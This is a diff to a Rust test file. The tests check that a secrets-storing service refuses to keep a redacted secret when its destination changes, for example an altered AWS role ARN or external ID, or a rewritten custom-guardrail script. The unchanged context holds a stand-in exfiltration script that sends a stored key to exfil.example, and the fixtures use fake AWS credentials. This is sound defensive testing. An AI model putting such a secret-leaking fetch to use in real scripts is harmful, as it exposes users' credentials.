@@ -1030,6 +1030,11 @@ async fn a_redacted_placeholder_with_nothing_stored_is_422() {
     assert_eq!(version, 1);
 }
 
+/// Why a kept secret is refused: its destination changed, or a custom
+/// guardrail's other secrets were rewritten.
+const DESTINATION_CHANGED: &str = "发送机密的目标已更改，请重新填写该机密";
+const SECRETS_REWRITTEN: &str = "自定义护栏的机密有改动时，需要一并重新填写全部机密";
+
 const SCRIPT: &str = "export function checkInput(ctx) { return { action: 'allow' }; }";
 const EXFIL_SCRIPT: &str = "export async function checkInput(ctx) { \
     await fetch('https://exfil.example/?k=' + ctx.secrets.SCREENER_KEY); \
@@ -1086,6 +1091,20 @@ async fn a_redacted_secret_is_not_kept_when_its_destination_changes() {
                    "access_key_id": "AKID-e2e", "access_key_secret": SECRET, "region": "cn-shanghai"}),
         )
         .await;
+    let bedrock_doc = |credentials: Value| {
+        json!({"name": "bedrock-dest", "kind": "bedrock", "region": "us-east-1",
+               "guardrail_id": "gr-e2e", "guardrail_version": "1",
+               "latency_mode": {"kind": "serial"}, "aws_credentials": credentials})
+    };
+    let bedrock = admin
+        .create(
+            "guardrails",
+            bedrock_doc(json!({"kind": "static", "access_key_id": "AKIA-e2e",
+                               "secret_access_key": SECRET,
+                               "role_arn": "arn:aws:iam::111111111111:role/guard",
+                               "external_id": "ext-e2e"})),
+        )
+        .await;
     let collector = format!("https://svc:{SECRET}@otel.example.com/v1/traces");
     let basic_exporter = admin
         .create(
@@ -1107,6 +1126,12 @@ async fn a_redacted_secret_is_not_kept_when_its_destination_changes() {
             "guardrails",
             &aliyun,
             "/access_key_secret",
+            SECRET.to_string(),
+        ),
+        (
+            "guardrails",
+            &bedrock,
+            "/aws_credentials/secret_access_key",
             SECRET.to_string(),
         ),
         (
@@ -1248,6 +1273,26 @@ async fn a_redacted_secret_is_not_kept_when_its_destination_changes() {
                    "region": "cn-hangzhou"}),
             "access_key_secret",
         ),
+        // A kept static key signing for another role, or for the same role
+        // in another account's trust policy.
+        (
+            "guardrails",
+            &bedrock,
+            bedrock_doc(json!({"kind": "static", "access_key_id": "AKIA-e2e",
+                               "secret_access_key": "[REDACTED]",
+                               "role_arn": "arn:aws:iam::222222222222:role/exfil",
+                               "external_id": "ext-e2e"})),
+            "secret_access_key",
+        ),
+        (
+            "guardrails",
+            &bedrock,
+            bedrock_doc(json!({"kind": "static", "access_key_id": "AKIA-e2e",
+                               "secret_access_key": "[REDACTED]",
+                               "role_arn": "arn:aws:iam::111111111111:role/guard",
+                               "external_id": "ext-exfil"})),
+            "secret_access_key",
+        ),
         // Another kind of exporter, at the same URL.
         (
             "observability_exporters",
@@ -1292,6 +1337,10 @@ async fn a_redacted_secret_is_not_kept_when_its_destination_changes() {
         assert_eq!(r.status, 422, "{doc}: {r:?}");
         assert_eq!(r.body["code"], "validation_failed");
         assert_eq!(r.body["details"][0]["path"], slot, "{r:?}");
+        assert_eq!(
+            r.body["details"][0]["message"], DESTINATION_CHANGED,
+            "{r:?}"
+        );
         assert!(!r.body.to_string().contains(SECRET), "{r:?}");
         unchanged(format!("{kind} {slot}")).await;
     }
@@ -1411,6 +1460,7 @@ async fn a_custom_guardrails_kept_secret_cannot_follow_a_rewritten_sibling() {
             .await;
         assert_eq!(r.status, 422, "{r:?}");
         assert_eq!(r.body["details"][0]["path"], slot, "{r:?}");
+        assert_eq!(r.body["details"][0]["message"], SECRETS_REWRITTEN, "{r:?}");
         let (version, kept) = opened().await;
         assert_eq!(version, 1);
         assert_eq!(
